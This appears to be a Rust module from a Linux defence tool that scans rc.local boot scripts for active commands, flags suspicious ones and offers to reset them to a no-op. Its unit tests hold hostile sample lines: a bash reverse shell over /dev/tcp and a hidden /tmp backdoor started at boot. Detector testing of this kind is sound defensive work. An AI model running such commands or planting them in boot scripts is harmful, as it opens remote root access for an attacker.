//! `rc.local` and friends.
//!
//! These scripts run as root at boot. Most modern distributions ship them
//! empty or not at all, so any real command in one is worth reviewing.

use std::path::Path;

use crate::core::scan::{effective_line, read_text_file, suspicious_matches};
use crate::core::{DefenderContext, Result, prompt_yes, require_root};

/// Boot and shutdown scripts run as root, across distributions.
const RC_FILES: &[&str] = &[
    "/etc/rc.local",
    "/etc/rc.d/rc.local",
    "/etc/rc.local.shutdown",
];

/// Report commands that `rc.local` runs at boot, and offer to blank them.
pub fn run(ctx: &DefenderContext) -> Result {
    let is_root = require_root().is_ok();
    let mut found_any = false;

    for path in RC_FILES {
        let path = Path::new(path);
        let Some(contents) = read_text_file(path) else {
            continue;
        };

        let commands = active_commands(&contents);
        ctx.debug(&format!(
            "{} has {} active command(s)",
            path.display(),
            commands.len()
        ));

        if commands.is_empty() {
            continue;
        }

        found_any = true;
        println!(
            "[!] {} runs {} command(s) at boot:",
            path.display(),
            commands.len()
        );

        for command in &commands {
            let reasons = suspicious_matches(command);
            if reasons.is_empty() {
                println!("    - {}", command);
            } else {
                println!("    - {}  [!] {}", command, reasons.join(", "));
            }
        }

        if !is_root {
            println!("[!] Not running as root — skipping cleanup option.");
            continue;
        }

        if prompt_yes(&format!(
            "[?] Blank out the commands in {}? (y/N)",
            path.display()
        ))? {
            neutralise(path)?;
            println!("[+] Reset {} to a no-op", path.display());
        }
    }

    if !found_any {
        println!("[✓] No rc.local scripts contain active commands");
    }

    Ok(())
}

/// Replace the file with a shebang and a bare `exit 0`, preserving the file so
/// the boot sequence does not change shape, while removing what it does.
fn neutralise(path: &Path) -> Result {
    std::fs::write(path, "#!/bin/sh\nexit 0\n")?;
    Ok(())
}

/// Commands the script actually executes, ignoring comments, blank lines, the
/// shebang, and the conventional trailing `exit 0`.
fn active_commands(contents: &str) -> Vec<String> {
    contents
        .lines()
        .filter(|line| !line.trim_start().starts_with("#!"))
        .filter_map(effective_line)
        .filter(|line| *line != "exit 0")
        .map(str::to_string)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_stock_rc_local_has_no_commands() {
        let stock = "#!/bin/sh -e\n#\n# rc.local\n#\n\nexit 0\n";
        assert!(active_commands(stock).is_empty());
    }

    #[test]
    fn finds_an_injected_command() {
        let tampered = "#!/bin/sh -e\n/tmp/.backdoor &\nexit 0\n";
        assert_eq!(active_commands(tampered), vec!["/tmp/.backdoor &"]);
    }

    #[test]
    fn an_injected_reverse_shell_is_explained() {
        let tampered = "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nexit 0\n";
        let commands = active_commands(tampered);

        assert_eq!(commands.len(), 1);
        assert!(!suspicious_matches(&commands[0]).is_empty());
    }

    #[test]
    fn the_shebang_is_not_a_command() {
        assert!(active_commands("#!/bin/bash\nexit 0\n").is_empty());
    }
}
